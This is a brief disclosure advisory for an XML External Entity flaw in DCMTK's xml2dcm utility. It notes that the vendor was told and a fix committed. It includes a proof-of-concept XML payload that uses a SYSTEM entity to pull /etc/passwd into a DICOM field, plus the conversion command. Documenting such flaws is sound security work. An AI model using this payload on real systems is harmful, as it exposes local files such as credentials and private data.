# XXE injection in xml2dcm utility

xml2dcm utility is vulnerable to XML External Entity (XXE) Injection. The utility doesn’t have any configuration parameters to disable DTDs (External Entities) completely. This parser allows processing and converting XML with external entities. It can be used for reading local files, which may contain sensitive data such as passwords or private user data.

## Steps to reproduce:
1) Create xml with external entity:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
   <!DOCTYPE foo [ 
   <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
…
<element tag="0010,0010" vr="PN" vm="1" len="32" name="PatientName">&xxe;</element>
…
```
2) Convert xml to dcm using the xml2dcm:
$ xml2dcm xxe.xml xxe.dcm
3) The result DICOM-file will include the content of `/etc/passwd` file.

## Information
The vendor was [informed](./data/Advisory_DCMTK_xml2dcm_xxe.pdf) and vulnerability has  been [fixed](http://git.dcmtk.org/?p=dcmtk.git;a=commit;h=dbe6898efea3ba1dd5c50e34d2d5ccd741ef7a18).
